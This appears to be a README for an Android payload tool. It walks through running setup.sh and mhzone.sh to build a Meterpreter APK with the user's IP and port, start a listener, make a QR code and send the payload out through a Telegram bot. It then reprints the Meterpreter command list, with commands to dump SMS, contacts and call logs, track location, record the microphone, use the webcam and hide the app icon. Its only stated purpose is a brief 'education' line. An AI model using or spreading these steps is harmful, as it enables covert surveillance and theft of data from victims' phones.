# Android_payload
For only Education perpouse



First install setup.sh using 
bash setup.sh

after this
use 

bash mhzone.sh

choose number 1 to make a Payload 
choose number 2 to to start listener
choose number 3 to make QR code choose number 4 to upload payload on telegram 

how to make payload 
choose number 1 and enter your IP address if you don't know about it you use 127.0.0.1
no type your port default if 4444
you choose anyone 
no set your app name 
it will go into your storage/ emulated/0 place 


now a time to assess device 
choose 2 option
and press enter 
enter l hist #example 127.0.0.1
lport #example 4444
it start automatically wait for 2 to 5 minute 
how to asst their file 
you type help on metaspolit 


Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter s
                              cript
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as
                               a background thread
    channel                   Displays information or control
                              active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (
                              for http/https)
    disable_unicode_encoding  Disables encoding of unicode str
                              ings
    enable_unicode_encoding   Enables encoding of unicode stri
                              ngs
    exit                      Terminate the meterpreter sessio
                              n
    get_timeouts              Get the current session timeout
                              values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Pos
                              t module
    irb                       Open an interactive Ruby shell o
                              n the current session
    load                      Load one or more meterpreter ext
                              ensions
    machine_id                Get the MSF ID of the machine at
                              tached to the session
    pry                       Open the Pry debugger on the cur
                              rent session
    quit                      Terminate the meterpreter sessio
                              n
    read                      Reads data from a channel
    resource                  Run the commands stored in a fil
                              e
    run                       Executes a meterpreter script or
                               Post module
    secure                    (Re)Negotiate TLV packet encrypt
                              ion on the session
    sessions                  Quickly switch to another sessio
                              n
    set_timeouts              Set the current session timeout
                              values
    sleep                     Force Meterpreter to go quiet, t
                              hen re-establish session
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current ses
                              sion
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to t
                              he screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (a
                              lias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local fil
                              e to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local ma
                              chine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    portfwd                   Forward a local port to a remote
                               service
    route                     View and modify the routing tabl
                              e


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    execute                   Execute a command
    getenv                    Get one or more environment vari
                              able values
    getpid                    Get the current process identifi
                              er
    getuid                    Get the user that the server is
                              running as
    localtime                 Displays the target system local
                               date and time
    pgrep                     Filter processes by name
    ps                        List running processes
    shell                     Drop into a system command shell
    sysinfo                   Gets information about the remot
                              e system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    screenshare               Watch the remote user desktop in
                               real time
    screenshot                Grab a screenshot of the interac
                              tive desktop


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default mi
                              crophone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specifi
                              ed webcam
    webcam_stream             Play a video stream from the spe
                              cified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav
                              ) on the target system


Android Commands
================

    Command                   Description
    -------                   -----------
    activity_start            Start an Android activity from a
                               Uri string
    check_root                Check if device is rooted
    dump_calllog              Get call log
    dump_contacts             Get contacts list
    dump_sms                  Get sms messages
    geolocate                 Get current lat-long using geolo
                              cation
    hide_app_icon             Hide the app icon from the launc
                              her
    interval_collect          Manage interval collection capab
                              ilities
    send_sms                  Sends SMS from target session
    set_audio_mode            Set Ringer Mode
    sqlite_query              Query a SQLite database from sto
                              rage
    wakelock                  Enable/Disable Wakelock
    wlan_geolocate            Get current lat-long using WLAN
                              information


Application Controller Commands
===============================

    Command                   Description
    -------                   -----------
    app_install               Request to install apk file
    app_list                  List installed apps in the devic
                              e
    app_run                   Start Main Activity for package
                              name
    app_uninstall             Request to uninstall application

For more info on a specific command, use <command> -h or help <command>.








if you want to upload this file on telegram you need to make your telegram using batfather first enter your bot token second enter chat ID it will auto upload on your bot
